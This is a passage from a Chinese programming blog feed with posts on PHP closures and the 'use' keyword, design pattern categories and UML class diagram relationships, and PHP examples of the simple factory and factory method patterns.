<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>那么是不是任何情况下，想通过匿名函数改变外部变量值都一定要通过引用方式向 use 传值呢？看下面这个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], <span class="title class_">ArrayObject</span>::<span class="variable constant_">ARRAY_AS_PROPS</span>);</span><br><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)<span class="keyword">use</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span>[<span class="number">0</span>]++;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$msg</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$msg</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行输出</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">ArrayObject <span class="built_in">Object</span></span><br><span class="line">(</span><br><span class="line">    [storage:ArrayObject:private] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">            [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">ArrayObject <span class="built_in">Object</span></span><br><span class="line">(</span><br><span class="line">    [storage:ArrayObject:private] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">            [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>可见，如果传递 object 类型的变量，即使不显示使用引用传递，匿名函数中变量值的改变同样会影响到外部相关变量。</p>
<p>但是，问题又来了。向 use 传递 object 变量时，使用引用与不使用引用到底有没有区别呢？还是来看例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)<span class="keyword">use</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>[<span class="number">0</span>],<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], <span class="title class_">ArrayObject</span>::<span class="variable constant_">ARRAY_AS_PROPS</span>);</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行输出</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">PHP Notice:  <span class="literal">Undefined</span> variable: msg</span><br></pre></td></tr></table></figure>

<p>我们改为使用引用传递</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)<span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>[<span class="number">0</span>],<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>运行输出</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>

<p>可见使用引用传递时，即使变量滞后于函数定义，函数内部还是可以找到外部相应的变量，不会出现变量未定义的情况。两者还是有区别的。</p>
<h2 id="关于-class-中匿名函数里的-this-及-use"><a href="#关于-class-中匿名函数里的-this-及-use" class="headerlink" title="关于 class 中匿名函数里的 this 及 use"></a>关于 class 中匿名函数里的 this 及 use</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_num</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mkFunc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;_num++, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;_num,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">mkFunc</span>();</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">get</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>可见匿名函数里的 this 就是指当前对象，不需要使用 use 就可以直接找到。</p>
<p>还是上面的例子，如果一定要使用 use 会是什么效果呢？ </p>
<p>将 mkFunc 改为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mkFunc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//唯一改动是此处加了use</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)<span class="keyword">use</span>(<span class="params"><span class="variable">$this</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;_num++, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行输出</p>
<figure class="highlight pony"><table><tr><td class="code"><pre><span class="line"><span class="type">PHP</span> <span class="type">Fatal</span> <span class="keyword">error</span>:  <span class="type">Cannot</span> <span class="keyword">use</span> $<span class="literal">this</span> <span class="keyword">as</span> lexical variable </span><br></pre></td></tr></table></figure>

<p>修改为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mkFunc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$self</span> = <span class="variable language_">$this</span>;</span><br><span class="line">    <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)<span class="keyword">use</span>(<span class="params"><span class="variable">$self</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;_num++, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>可见是否使用 use，效果是一样的。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>设计模式（一），UML 类图设计</title>
    <url>/2017/11/uml-design/</url>
    <content><![CDATA[<h2 id="设计模式背景"><a href="#设计模式背景" class="headerlink" title="设计模式背景"></a>设计模式背景</h2><p>开始实验之前，有必要先了解一些背景信息和相关基础知识。</p>
<span id="more"></span>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">在软件工程中，设计模式（design <span class="keyword">pattern</span>）是对软件设计中普遍存在（反复出现）的各种问题，所提出的解决方案。</span><br><span class="line"></span><br><span class="line">设计模式并不直接用来完成代码的编写，而是描述在各种不同情况下，要怎么解决问题的一种方案。面向对象设计模式通常以类别或对象) 来描述其中的关系和相互作用，但不涉及用来完成应用程序的特定类别或对象。设计模式能使不稳定依赖于相对稳定、具体依赖于相对抽象，避免会引起麻烦的紧耦合，以增强软件设计面对并适应变化的能力。</span><br><span class="line"></span><br><span class="line">《设计模式》一书原先把设计模式分为创建型模式、结构型模式、行为型模式，把它们通过授权、聚合、诊断的概念来描述</span><br><span class="line"></span><br><span class="line">​ <span class="comment">-- 参考维基百科</span></span><br></pre></td></tr></table></figure>

<h2 id="设计模式主要分为三大类，各自还有许多子类："><a href="#设计模式主要分为三大类，各自还有许多子类：" class="headerlink" title="设计模式主要分为三大类，各自还有许多子类："></a>设计模式主要分为三大类，各自还有许多子类：</h2><ol>
<li>创建型模式</li>
</ol>
<table>
<thead>
<tr>
<th>模式名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>抽象工厂模式</td>
<td>为一个产品族提供了统一的创建接口。当需要这个产品族的某一系列的时候，可以从抽象工厂中选出相应的系列创建一个具体的工厂类。</td>
</tr>
<tr>
<td>工厂方法模式</td>
<td>定义一个接口用于创建对象，但是让子类决定初始化哪个类。工厂方法把一个类的初始化下放到子类。</td>
</tr>
<tr>
<td>生成器模式</td>
<td>将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。</td>
</tr>
<tr>
<td>惰性初始模式</td>
<td>推迟对象的创建、数据的计算等需要耗费较多资源的操作，只有在第一次访问的时候才执行。</td>
</tr>
<tr>
<td>对象池模式</td>
<td>通过回收利用对象避免获取和释放资源所需的昂贵成本。</td>
</tr>
<tr>
<td>原型模式</td>
<td>用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。</td>
</tr>
<tr>
<td>单例模式</td>
<td>确保一个类只有一个实例，并提供对该实例的全局访问。</td>
</tr>
</tbody></table>
<ol start="2">
<li>结构性模式</li>
</ol>
<table>
<thead>
<tr>
<th>模式名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>适配器模式</td>
<td>将某个类的接口转换成客户端期望的另一个接口表示。适配器模式可以消除由于接口不匹配所造成的类兼容性问题。</td>
</tr>
<tr>
<td>桥接模式</td>
<td>将一个抽象与实现解耦，以便两者可以独立的变化。</td>
</tr>
<tr>
<td>组合模式</td>
<td>把多个对象组成树状结构来表示局部与整体，这样用户可以一样的对待单个对象和对象的组合。</td>
</tr>
<tr>
<td>修饰模式</td>
<td>向某个对象动态地添加更多的功能。修饰模式是除类继承外另一种扩展功能的方法。</td>
</tr>
<tr>
<td>外观模式</td>
<td>为子系统中的一组接口提供一个一致的界面， 外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。</td>
</tr>
<tr>
<td>享元</td>
<td>通过共享以便有效的支持大量小颗粒对象。</td>
</tr>
<tr>
<td>代理</td>
<td>为其他对象提供一个代理以控制对这个对象的访问。</td>
</tr>
</tbody></table>
<ol start="3">
<li>行为型模式</li>
</ol>
<table>
<thead>
<tr>
<th>模式名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>黑板</td>
<td>广义的观察者在系统范围内交流信息，允许多位读者和写者。</td>
</tr>
<tr>
<td>责任链</td>
<td>为解除请求的发送者和接收者之间耦合，而使多个对象都有机会处理这个请求。将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它。</td>
</tr>
<tr>
<td>命令</td>
<td>将一个请求封装为一个对象，从而使你可用不同的请求对客户进行参数化；对请求排队或记录请求日志，以及支持可取消的操作。</td>
</tr>
<tr>
<td>解释器</td>
<td>给定一个语言，定义它的文法的一种表示，并定义一个解释器，该解释器使用该表示来解释语言中的句子。</td>
</tr>
<tr>
<td>迭代器</td>
<td>提供一种方法顺序访问一个聚合对象中各个元素，而又不需暴露该对象的内部表示。</td>
</tr>
<tr>
<td>中介者</td>
<td>包装了一系列对象相互作用的方式，使得这些对象不必相互明显作用，从而使它们可以松散偶合。当某些对象之间的作用发生改变时，不会立即影响其他的一些对象之间的作用，保证这些作用可以彼此独立的变化。</td>
</tr>
<tr>
<td>备忘录</td>
<td>备忘录对象是一个用来存储另外一个对象内部状态的快照的对象。备忘录模式的用意是在不破坏封装的条件下，将一个对象的状态捉住，并外部化，存储起来，从而可以在将来合适的时候把这个对象还原到存储起来的状态。</td>
</tr>
<tr>
<td>空对象</td>
<td>通过提供默认对象来避免空引用。</td>
</tr>
<tr>
<td>观察者模式</td>
<td>在对象间定义一个一对多的联系性，由此当一个对象改变了状态，所有其他相关的对象会被通知并且自动刷新。</td>
</tr>
<tr>
<td>规格</td>
<td>以布尔形式表示的可重绑定的商业逻辑。</td>
</tr>
<tr>
<td>状态</td>
<td>让一个对象在其内部状态改变的时候，其行为也随之改变。状态模式需要对每一个系统可能获取的状态创立一个状态类的子类。当系统的状态变化时，系统便改变所选的子类。</td>
</tr>
<tr>
<td>策略</td>
<td>定义一个算法的系列，将其各个分装，并且使他们有交互性。策略模式使得算法在用户使用的时候能独立的改变。</td>
</tr>
<tr>
<td>模板方法</td>
<td>模板方法模式准备一个抽象类，将部分逻辑以具体方法及具体构造子类的形式实现，然后声明一些抽象方法来迫使子类实现剩余的逻辑。不同的子类可以以不同的方式实现这些抽象方法，从而对剩余的逻辑有不同的实现。先构建一个顶级逻辑框架，而将逻辑的细节留给具体的子类去实现。</td>
</tr>
<tr>
<td>访问者</td>
<td>封装一些施加于某种数据结构元素之上的操作。一旦这些操作需要修改，接受这个操作的数据结构可以保持不变。访问者模式适用于数据结构相对未定的系统，它把数据结构和作用于结构上的操作之间的耦合解脱开，使得操作集合可以相对自由的演化。</td>
</tr>
</tbody></table>
<p>当你看完上面这些介绍，可能你已经感受到了来自设计模式的压力，我也不例外，虽然我了解一些设计模式的知识，但是面对上面总结的各种模式，我也感到很无力，毕竟这是无数大牛精心设计且经过实践证明的 ‘’ 真理 ‘’。但是，越是这样的技术，越具有挑战性，你只要完全掌握上面内容的三分之一，你的编程水平已经上了一个台阶。了解并掌握设计模式的思想和原理，不仅有助于你写出优质健壮的代码，也将极大地提高系统的性能。同时你也将更容易的看懂他人优秀的代码。</p>
<p>Laravel 框架无疑是 PHP 中最优秀的框架之一，其优秀的原因在于他的先进的理念设计，优雅的代码结构，以及灵活的使用了大量的设计模式，使得框架非常稳健且易于扩展。所以，了解并掌握必要的设计模式的知识，是编程进阶的基础。</p>
<p>在本课程中，我将会根据相关资料参考，从三类设计模式挑选 16 个常用的设计模式来讲解，分为两个实验。</p>
<h2 id="UML-类图和时序图"><a href="#UML-类图和时序图" class="headerlink" title="UML 类图和时序图"></a>UML 类图和时序图</h2><p>如果你之前没有听说过或者接触过 UML ，那么可以在此处简单了解一下，更多详细的资料大家自行去查阅教程。</p>
<p>这里简单介绍一下 UML 类图和时序图的要点，让你可以看懂后续文档中给出的类图或时序图，可以更形象的帮助你理解设计模式。（UML 内容较复杂，希望大家私下能去多了解一些相关知识）</p>
<p>首先，下面是一张典型的 UML 类图</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">车的类图结构为 &lt;&gt;，表示车是一个抽象类；</span><br><span class="line"></span><br><span class="line">它有两个继承类：小汽车和自行车；它们之间的关系为实现关系，使用带空心箭头的虚线表示；</span><br><span class="line"></span><br><span class="line">小汽车为与 SUV 之间也是继承关系，它们之间的关系为泛化关系，使用带空心箭头的实线表示；</span><br><span class="line"></span><br><span class="line">小汽车与发动机之间是组合关系，使用带实心菱形的实线表示；</span><br><span class="line"></span><br><span class="line">学生与班级之间是聚合关系，使用带空心菱形的实线表示；</span><br><span class="line"></span><br><span class="line">学生与身份证之间为关联关系，使用一根实线表示；</span><br><span class="line"></span><br><span class="line">学生上学需要用到自行车，与自行车是一种依赖关系，使用带箭头的虚线表示；</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 上述描述参考： Graphic Design Patterns</span></span><br></pre></td></tr></table></figure>

<h2 id="UML-类图与类的关系"><a href="#UML-类图与类的关系" class="headerlink" title="UML 类图与类的关系"></a>UML 类图与类的关系</h2><p>部分内容参考：UML 类图与类的关系详解</p>
<p>向大家推荐一个在线 UML 类图制作工具：processon</p>
<p>类的关系有泛化 (Generalization)、实现（Realization）、依赖 (Dependency) 和关联 (Association)。其中关联又分为一般关联关系和聚合关系 (Aggregation)，合成关系 (Composition)</p>
<p>类图（Class Diagram）: 类图是面向对象系统建模中最常用和最重要的图，是定义其它图的基础。类图主要是用来显示系统中的类、接口以及它们之间的静态结构和关系的一种静态模型。</p>
<p>类图的 3 个基本组件：类名、属性、方法。</p>
<ol>
<li><p>泛化 (generalization)<br>表示 is-a 的关系，是对象之间耦合度最大的一种关系，子类继承父类的所有细节。直接使用语言中的继承表达。在类图中使用带三角箭头的实线表示，箭头从子类指向父类。</p>
</li>
<li><p>实现（Realization）<br>在类图中就是接口和实现的关系。在类图中使用带三角箭头的虚线表示，箭头从实现类指向接口。</p>
</li>
<li><p>关联关系 (association)<br>关联关系是用一条带箭头的直线表示的；它描述不同类的对象之间的结构关系；它是一种静态关系， 通常与运行状态无关，一般由常识等因素决定的；它一般用来定义对象之间静态的、天然的结构； 所以，关联关系是一种 “强关联” 的关系；</p>
</li>
</ol>
<p>学生与学校是一种关联关系。</p>
<ol start="4">
<li>依赖 (Dependency)<br>依赖关系是用一套带箭头的虚线表示的；如下图表示 A 依赖于 B；他描述一个对象在运行期间会用到另一个对象的关系；</li>
</ol>
<p>对象之间最弱的一种关联方式，是临时性的关联。代码中一般指由局部变量、函数参数、返回值建立的对于其他对象的调用关系。一个类调用被依赖类中的某些方法而得以完成这个类的一些职责。在类图使用带箭头的虚线表示，箭头从使用类指向被依赖的类。</p>
<ol start="5">
<li><p>聚合 (Aggregation)<br>表示 has-a 的关系，是一种不稳定的包含关系。较强于一般关联，有整体与局部的关系，并且没有了整体，局部也可单独存在。如公司和员工的关系，公司包含员工，但如果公司倒闭，员工依然可以换公司。在类图使用空心的菱形表示，菱形从局部指向整体。</p>
</li>
<li><p>组合 (Composition)<br>表示 contains-a 的关系，是一种强烈的包含关系。组合类负责被组合类的生命周期。是一种更强的聚合关系。部分不能脱离整体存在。如公司和部门的关系，没有了公司，部门也不能存在了；调查问卷中问题和选项的关系；订单和订单选项的关系。在类图使用实心的菱形表示，菱形从局部指向整体。</p>
</li>
</ol>
<h2 id="聚合和组合的区别"><a href="#聚合和组合的区别" class="headerlink" title="聚合和组合的区别"></a>聚合和组合的区别</h2><p>这两个比较难理解，重点说一下。聚合和组合的区别在于：聚合关系是 “has-a” 关系，组合关系是 “contains-a” 关系；聚合关系表示整体与部分的关系比较弱，而组合比较强；聚合关系中代表部分事物的对象与代表聚合事物的对象的生存期无关，一旦删除了聚合对象不一定就删除了代表部分事物的对象。组合中一旦删除了组合对象，同时也就删除了代表部分事物的对象。</p>
]]></content>
      <categories>
        <category>DataStructure</category>
      </categories>
  </entry>
  <entry>
    <title>设计模式（二），设计模式详解</title>
    <url>/2017/11/uml-design1/</url>
    <content><![CDATA[<h2 id="设计模式详解（1-8）"><a href="#设计模式详解（1-8）" class="headerlink" title="设计模式详解（1-8）"></a>设计模式详解（1-8）</h2><p>工厂模式</p>
<p>工厂模式具体可分为三类模式：简单工厂模式，工厂方法模式，抽象工厂模式；</p>
<span id="more"></span>

<h2 id="1-简单工厂模式"><a href="#1-简单工厂模式" class="headerlink" title="1. 简单工厂模式"></a>1. 简单工厂模式</h2><p>又称为静态工厂方法 (Static Factory Method) 模式，它属于类创建型模式。在简单工厂模式中，可以根据参数的不同返回不同类的实例。简单工厂模式专门定义一个类来负责创建其他类的实例，被创建的实例通常都具有共同的父类。</p>
<p>角色：</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">Factory 类：负责创建具体产品的实例</span><br><span class="line"></span><br><span class="line"><span class="built_in">Product</span> 类：抽象产品类，定义产品子类的公共接口</span><br><span class="line"></span><br><span class="line">ConcreteProduct 类：具体产品类，实现 <span class="built_in">Product</span> 父类的接口功能，也可添加自定义的功能</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//简单工厂模式</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;I am Cat class &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;I am Dog class &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">CreateAnimal</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;cat&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">      &#125; <span class="keyword">elseif</span> (<span class="variable">$name</span> == <span class="string">&#x27;dog&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cat</span> = <span class="title class_">Factory</span>::<span class="title function_ invoke__">CreateAnimal</span>(<span class="string">&#x27;cat&#x27;</span>);</span><br><span class="line"><span class="variable">$dog</span> = <span class="title class_">Factory</span>::<span class="title function_ invoke__">CreateAnimal</span>(<span class="string">&#x27;dog&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>简单工厂模式最大的优点在于实现对象的创建和对象的使用分离，将对象的创建交给专门的工厂类负责，但是其最大的缺点在于工厂类不够灵活，增加新的具体产品需要修改工厂类的判断逻辑代码，而且产品较多时，工厂方法代码将会非常复杂。</p>
<h2 id="2-工厂方法模式"><a href="#2-工厂方法模式" class="headerlink" title="2. 工厂方法模式"></a>2. 工厂方法模式</h2><p>此模式中，通过定义一个抽象的核心工厂类，并定义创建产品对象的接口，创建具体产品实例的工作延迟到其工厂子类去完成。这样做的好处是核心类只关注工厂类的接口定义，而具体的产品实例交给具体的工厂子类去创建。当系统需要新增一个产品，无需修改现有系统代码，只需要添加一个具体产品类和其对应的工厂子类，是系统的扩展性变得很好，符合面向对象编程的开闭原则 ;</p>
<p>角色：</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Product</span>：抽象产品类</span><br><span class="line"></span><br><span class="line">ConcreteProduct：具体产品类</span><br><span class="line"></span><br><span class="line">Factory：抽象工厂类</span><br><span class="line"></span><br><span class="line">ConcreteFactory：具体工厂类</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">implements</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;I ran slowly &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;I am Cat class &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">implements</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m running fast &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;I am Dog class &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createAnimal</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CatFactory</span> <span class="keyword">extends</span> <span class="title">Factory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createAnimal</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DogFactory</span> <span class="keyword">extends</span> <span class="title">Factory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createAnimal</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cat</span> = <span class="title class_">CatFactory</span>::<span class="title function_ invoke__">createAnimal</span>();</span><br><span class="line"><span class="variable">$cat</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$cat</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$dog</span> = <span class="title class_">DogFactory</span>::<span class="title function_ invoke__">createAnimal</span>();</span><br><span class="line"><span class="variable">$dog</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$dog</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br></pre></td></tr></table></figure>

<p>工厂方法模式是简单工厂模式的进一步抽象和推广。由于使用了面向对象的多态性，工厂方法模式保持了简单工厂模式的优点，而且克服了它的缺点。在工厂方法模式中，核心的工厂类不再负责所有产品的创建，而是将具体创建工作交给子类去做。这个核心类仅仅负责给出具体工厂必须实现的接口，而不负责产品类被实例化这种细节，这使得工厂方法模式可以允许系统在不修改工厂角色的情况下引进新产品。</p>
